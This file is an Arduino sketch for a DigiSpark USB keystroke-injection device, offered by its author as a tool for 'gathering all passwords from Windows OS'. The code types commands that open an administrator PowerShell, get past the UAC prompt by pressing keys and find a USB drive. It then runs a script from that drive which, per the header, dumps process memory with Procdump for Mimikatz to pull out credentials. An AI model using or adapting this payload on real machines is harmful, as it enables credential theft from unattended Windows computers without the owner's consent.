
/*
 DigiSpark Rubber Ducky

 Gathering all passwords from Windows OS: Using Procdump
 and Procdump64 depends on Computer Processor.Extracting
 dump.dmp file with Mimikatz

 *  Author : N3o (Farzin Haque)
 *   GIT:
 *       https://github.com/farzinh/Digispark-FlashMemory-Duckduino
 *  Twitter:
 *       https://twitter.com/panisher2011

*/
#include "DigiKeyboard.h"


void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);

  //open Administrator powershell
  powershell_admin();

  //Select yes on UAC prompt
  send_uac();
  
  //Select Flash drive with Label : D
  find_FDriveAndArchitec();

  //Executing vbs Script
  vbs_script();

  //Close the command prompt
  closePowershell();

}

void find_FDriveAndArchitec(){

  //Findout Fash memory Drive
  //$usbPath = Get-CimInstance Win32_Volume | ? { $_.Label -eq 'D'} | select name
  DigiKeyboard.print("$usbPath = GET-WMIObject Win32_Volume | ? { $_.Label -eq 'D'} | select name");Enter();
  DigiKeyboard.print("cd $usbPath.name");Enter();

  //Findout system architecture: x86 or x64
  DigiKeyboard.print("(Get-WmiObject Win32_OperatingSystem).OSArchitecture > R.txt");Enter();
  
  }

void vbs_script(){
  
  DigiKeyboard.print("$command = \"cmd /C cscript .\\Proc.vbs $args\"");Enter();
  DigiKeyboard.print("invoke-expression $command");Enter();
  
  }

void Enter(){
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  }
void closePowershell(){
  
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  }

void send_uac(){
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  }

void powershell_admin(){
  
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  
  }

void loop() {
  // Do nothnig in the loop

}
